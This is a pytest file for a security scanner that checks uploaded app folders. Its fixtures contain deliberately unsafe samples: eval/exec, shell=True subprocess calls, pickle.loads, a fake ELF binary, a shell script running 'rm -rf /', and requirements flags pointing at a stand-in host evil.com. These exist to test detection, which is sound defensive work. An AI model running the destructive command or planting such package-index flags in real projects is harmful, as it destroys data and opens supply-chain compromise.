import os
import tempfile

from appmanager.security_scanner import run_security_scan


def test_scanner_clean_directory():
    with tempfile.TemporaryDirectory() as tmpdir:
        # Create a clean minimal sub-app
        manifest_path = os.path.join(tmpdir, "manifest.json")
        with open(manifest_path, "w") as f:
            f.write('{"name": "Clean App", "slug": "clean-app", "entry_point": "app:app"}')

        app_py = os.path.join(tmpdir, "app.py")
        with open(app_py, "w") as f:
            f.write(
                "from flask import Flask, jsonify\n"
                "app = Flask(__name__)\n"
                "@app.route('/')\n"
                "def index():\n"
                "    return jsonify({'status': 'ok'})\n"
            )

        req_txt = os.path.join(tmpdir, "requirements.txt")
        with open(req_txt, "w") as f:
            f.write("flask>=3.0.0\nrequests==2.31.0\n")

        report = run_security_scan(tmpdir)
        assert report.is_safe is True
        assert report.risk_level == "CLEAN"
        assert len(report.findings) == 0
        assert report.files_scanned >= 3
        assert report.py_files_scanned == 1


def test_scanner_detects_eval_and_exec():
    with tempfile.TemporaryDirectory() as tmpdir:
        app_py = os.path.join(tmpdir, "app.py")
        with open(app_py, "w") as f:
            f.write(
                "def bad_code(user_input):\n"
                "    return eval(user_input)\n"
                "def bad_exec(code):\n"
                "    exec(code)\n"
            )

        report = run_security_scan(tmpdir)
        assert report.is_safe is False
        assert report.risk_level == "CRITICAL"
        eval_findings = [f for f in report.findings if f.category == "Code Injection"]
        assert len(eval_findings) >= 2


def test_scanner_detects_command_injection_shell_true():
    with tempfile.TemporaryDirectory() as tmpdir:
        app_py = os.path.join(tmpdir, "app.py")
        with open(app_py, "w") as f:
            f.write(
                "import subprocess\n"
                "def run_cmd(cmd):\n"
                "    subprocess.Popen(f'ls {cmd}', shell=True)\n"
            )

        report = run_security_scan(tmpdir)
        assert report.is_safe is False
        assert report.risk_level == "CRITICAL"
        cmd_findings = [f for f in report.findings if "shell=True" in f.message]
        assert len(cmd_findings) >= 1


def test_scanner_detects_insecure_deserialization():
    with tempfile.TemporaryDirectory() as tmpdir:
        app_py = os.path.join(tmpdir, "app.py")
        with open(app_py, "w") as f:
            f.write("import pickle\ndef load_data(raw_data):\n    return pickle.loads(raw_data)\n")

        report = run_security_scan(tmpdir)
        assert report.is_safe is False
        assert report.risk_level == "CRITICAL"
        pickle_findings = [f for f in report.findings if f.category == "Insecure Deserialization"]
        assert len(pickle_findings) >= 1


def test_scanner_detects_forbidden_binaries_and_scripts():
    with tempfile.TemporaryDirectory() as tmpdir:
        # Create a forbidden .so file and .sh file
        so_file = os.path.join(tmpdir, "malicious.so")
        with open(so_file, "wb") as f:
            f.write(b"\x7fELF\x02\x01\x01\x00")

        sh_file = os.path.join(tmpdir, "run.sh")
        with open(sh_file, "w") as f:
            f.write("#!/bin/bash\nrm -rf /")

        report = run_security_scan(tmpdir)
        assert report.is_safe is False
        assert report.risk_level == "CRITICAL"
        bin_findings = [f for f in report.findings if f.category == "Forbidden Binary / Executable"]
        assert len(bin_findings) >= 2


def test_scanner_detects_suspicious_requirements_flags():
    with tempfile.TemporaryDirectory() as tmpdir:
        req_txt = os.path.join(tmpdir, "requirements.txt")
        with open(req_txt, "w") as f:
            f.write(
                "--extra-index-url http://evil.com/simple\n"
                "--trusted-host evil.com\n"
                "requests==2.31.0\n"
            )

        report = run_security_scan(tmpdir)
        assert report.is_safe is False
        assert report.risk_level in ("HIGH", "CRITICAL")
        dep_findings = [f for f in report.findings if f.category == "Dependency Injection Risk"]
        assert len(dep_findings) >= 2
